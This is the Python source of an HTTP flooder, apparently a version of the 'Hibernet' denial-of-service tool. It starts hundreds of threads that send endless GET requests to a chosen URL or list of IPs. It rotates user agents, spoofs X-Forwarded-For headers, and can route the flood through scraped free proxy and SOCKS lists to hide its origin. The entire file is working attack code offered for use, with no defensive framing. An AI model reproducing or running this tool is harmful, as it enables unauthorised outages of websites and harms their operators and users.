import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
import argparse
import json

print('''

██   ██ ██ ██████  ███████ ██████  ██   ██ ███████ ██   ██ 
██   ██ ██ ██   ██ ██      ██   ██ ██  ██  ██      ██  ██  
███████ ██ ██████  █████   ██████  █████   █████   █████   
██   ██ ██ ██   ██ ██      ██   ██ ██  ██  ██      ██  ██  
██   ██ ██ ██████  ███████ ██   ██ ██   ██ ███████ ██   ██

					By Kürşat
	''')

def fetch_user_agents():
    try:
        url = "https://gist.githubusercontent.com/KursatBB/97406a593fd014ed10fb7c88255a49eb/raw/547c39e247b4dad4a30c6cf8dcf49b4ef01b77f4/Hiberkek%2520User%2520Agents"
        response = urllib.request.urlopen(url)
        content = response.read().decode('utf-8')
        
        # Parse the content to extract user agents
        user_agents = []
        for line in content.split('\n'):
            if line.strip().startswith('"') and line.strip().endswith('",'):
                # Remove quotes and trailing comma
                ua = line.strip()[1:-2]
                user_agents.append(ua)
            elif line.strip().startswith('"') and line.strip().endswith('"'):
                # Remove quotes for the last item
                ua = line.strip()[1:-1]
                user_agents.append(ua)
        
        if not user_agents:
            print("Warning: No user agents found in the Gist. Using fallback list.")
            return get_fallback_user_agents()
            
        print("User-agents loaded successfully!")
        return user_agents
    except Exception as e:
        print(f"Warning: Failed to fetch user agents from Gist: {e}")
        print("Using fallback user agents list.")
        return get_fallback_user_agents()

def get_fallback_user_agents():
    # Fallback list of common user agents in case the Gist is unavailable
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
    ]

# Fetch user agents at startup
useragents = fetch_user_agents()


def starturl():
	global url
	global url2
	global urlport
	global choice1
	global ips
	global choice2
	global choice3
	global threads
	global multiple

	parser = argparse.ArgumentParser(description='Hibernet - A powerful HTTP flooder')
	parser.add_argument('-u', '--url', help='Target URL (e.g. http://example.com)')
	parser.add_argument('-f', '--file', help='File containing list of IPs')
	parser.add_argument('-p', '--proxy', action='store_true', help='Enable proxy mode')
	parser.add_argument('-s', '--socks', action='store_true', help='Enable SOCKS mode')
	parser.add_argument('-t', '--threads', type=int, default=800, help='Number of threads (default: 800)')
	parser.add_argument('-m', '--multiply', type=int, default=1, help='Multiplication factor (default: 1)')
	
	args = parser.parse_args()

	# Validate required arguments
	if not args.url and not args.file:
		print("Error: Either -u/--url or -f/--file must be specified")
		parser.print_help()
		sys.exit(1)

	# Handle IP list file
	if args.file:
		choice1 = "1"
		try:
			ips = open(args.file).readlines()
		except FileNotFoundError:
			print(f"Error: File {args.file} not found")
			sys.exit(1)
		except Exception as e:
			print(f"Error reading file: {e}")
			sys.exit(1)
	
	# Handle URL
	if args.url:
		choice1 = "0"
		url = args.url.strip()

		if url == "":
			print("Error: URL cannot be empty")
			sys.exit(1)

		try:
			if url[0]+url[1]+url[2]+url[3] == "www.":
				url = "http://" + url
			elif url[0]+url[1]+url[2]+url[3] == "http":
				pass
			else:
				url = "http://" + url
		except:
			print("Error: Invalid URL format")
			sys.exit(1)

		try:
			url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
		except:
			url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

		try:
			urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
		except:
			urlport = "80"

	# Set proxy mode
	if args.proxy and args.socks:
		print("Error: Cannot use both proxy and SOCKS mode simultaneously")
		sys.exit(1)
	elif args.proxy:
		choice2 = "y"
		choice3 = "0"
	elif args.socks:
		choice2 = "y"
		choice3 = "1"
	else:
		choice2 = "n"
		choice3 = "0"

	# Set threads and multiplication factor
	threads = args.threads
	multiple = args.multiply

	# Start the attack
	begin()

def proxymode():
	global choice2
	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()

def choiceproxysocks():
	global choice3
	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("You mistyped, try again.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
	if choice4 == "y":
		urlproxy = "http://free-proxy-list.net/"
		proxyget(urlproxy)
	else:
		proxylist()

def choicedownsocks():
	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
	if choice4 == "y":
		urlproxy = "https://www.socks-proxy.net/"
		proxyget(urlproxy)
	else:
		proxylist()

def proxyget(urlproxy):
	try:
		req = urllib.request.Request(("%s") % (urlproxy))
		req.add_header("User-Agent", random.choice(useragents))
		sourcecode = urllib.request.urlopen(req)
		part = str(sourcecode.read())
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write("")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies downloaded successfully.")
	except:
		print ("\nERROR!\n")
	proxylist()

def proxylist():
	global proxies
	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
	proxies = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		threads = int(input("Insert number of threads (800): "))
	except ValueError:
		threads = 800
		print ("800 threads selected.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
	except ValueError:
		print("You mistyped, try again.\n")
		multiplication()
	begin()

def begin():
	print("Starting attack...")
	loop()

def loop():
	global threads
	global acceptall
	global connection
	global go
	global x
	
	acceptall = [
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
	"Accept-Encoding: gzip, deflate\r\n", 
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	]
	connection = "Connection: Keep-Alive\r\n"
	x = 0
	go = threading.Event()
	if choice2 == "y":
		if choice3 == "0":
			for x in range(threads):
				RequestProxyHTTP(x+1).start()
				print ("Thread " + str(x) + " ready!")
			go.set()
		else:
			for x in range(threads):
				RequestSocksHTTP(x+1).start()
				print ("Thread " + str(x) + " ready!")
			go.set()
	else:
		for x in range(threads):
			RequestDefaultHTTP(x+1).start()
			print ("Thread " + str(x) + " ready!")
		go.set()


class RequestProxyHTTP(threading.Thread):

	def __init__(self, counter):
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self):
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		accept = random.choice(acceptall)
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
		forward = "X-Forwarded-For: " + randomip + "\r\n"
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		request = get_host + useragent + accept + forward + connection + "\r\n"
		current = x
		if current < len(proxies):
			proxy = proxies[current].strip().split(':')
		else:
			proxy = random.choice(proxies).strip().split(":")
		go.wait()
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(proxy[0]), int(proxy[1])))
				s.send(str.encode(request))
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(request))
				except:
					s.close()
			except:
				s.close()

class RequestSocksHTTP(threading.Thread):

	def __init__(self, counter):
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self):
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		accept = random.choice(acceptall)
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		request = get_host + useragent + accept + connection + "\r\n"
		current = x
		if current < len(proxies):
			proxy = proxies[current].strip().split(':')
		else:
			proxy = random.choice(proxies).strip().split(":")
		go.wait()
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
				s = socks.socksocket()
				s.connect((str(url2), int(urlport)))
				s.send (str.encode(request))
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(request))
				except:
					s.close()
			except:
				s.close()
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
					s = socks.socksocket()
					s.connect((str(url2), int(urlport)))
					s.send (str.encode(request))
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
					try:
						for y in range(multiple):
							s.send(str.encode(request))
					except:
						s.close()
				except:
					print ("Sock down. Retrying request. @", self.counter)
					s.close()

class RequestDefaultHTTP(threading.Thread):

	def __init__(self, counter):
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self):
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		accept = random.choice(acceptall)
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		request = get_host + useragent + accept + connection + "\r\n"
		go.wait()
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(url2), int(urlport)))
				s.send (str.encode(request))
				print ("Request sent! @", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(request))
				except:
					s.close()
			except:
				s.close()


if __name__ == '__main__':
	starturl()
